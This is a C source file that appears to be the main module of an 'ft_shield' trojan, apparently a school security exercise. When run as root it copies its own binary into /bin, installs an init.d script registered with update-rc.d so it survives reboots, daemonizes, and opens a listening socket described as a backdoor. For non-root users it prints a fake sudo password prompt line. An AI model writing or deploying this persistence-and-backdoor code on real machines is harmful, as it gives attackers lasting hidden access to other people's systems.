#include "ft_shield.h"

volatile sig_atomic_t g_sigint_received = 0;
volatile sig_atomic_t g_sigalrm_received = 0;

int ft_persistence(t_troyan *shield)
{
    shield->fd_init = fopen("/etc/init.d/ft_shield", "w");
    if (!shield->fd_init)
    {
        printf("ERROR: failed to open init.d file\n");
        return(-1);
    }
    fprintf(shield->fd_init, LSB, 10, 10, 10, 10, 10, 10, 10, 10, 10);
    fprintf(shield->fd_init, PERSISTENCE, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10);
    fclose(shield->fd_init);
    chmod("/etc/init.d/ft_shield", 0755);
    system("update-rc.d ft_shield defaults");               // Registration in the system
    return(0);
}

int ft_payload(t_troyan *shield)
{
    shield->fd = fopen("/proc/self/exe", "r");
    if (!shield->fd)
    {
        printf("ERROR: failed to open exe file\n");
        return(-1);
    }
    shield->fd_dest = fopen("/bin/ft_shield", "wb");
    if (!shield->fd_dest)
    {
        printf("ERROR: failed to open bin file\n");
        fclose(shield->fd);
        return(-1);
    }
    while ((shield->bytes_read = fread(shield->buffer_exe, 1, 1024, shield->fd)) != 0)
        fwrite(shield->buffer_exe, 1, shield->bytes_read, shield->fd_dest);
    fclose(shield->fd);
    fclose(shield->fd_dest);
    chmod("/bin/ft_shield", 0755);
    return(0);
}

int main(int argc, char **argv, char **env)
{
    t_troyan    *shield;

    (void)argc;
    (void)argv;

    shield = malloc(sizeof(t_troyan));
    if (!shield)
        return (1);
    memset(shield, 0, sizeof(t_troyan));
    init_signal();

    shield->env = env;
    shield->pwd = getpwuid(getuid());
    if (!shield->pwd)
    {
        free(shield);
        return (1);
    }
    if (shield->pwd->pw_uid)
    {
        printf("[sudo] password for %s \n", shield->pwd->pw_name);
        free(shield);
        return (1);
    }
    printf("%s\n", shield->pwd->pw_name);
    if (ft_payload(shield) || ft_persistence(shield))
    {
        free(shield);
        return (1);
    }

    if (ft_create_daemon(shield))
    {
        free(shield);
        return (1);
    }
    if (ft_lockfile() < 0) {
        free(shield);
		return (-1);
    }

    if (wait_backdoor())
    {
        free(shield);
        return (1);
    }

    if (init_servsocket(shield))
    {
        free(shield);
        return (1);
    }

    loop_server(shield);
    close(shield->socketfd);
    free(shield);
    return (0);
}
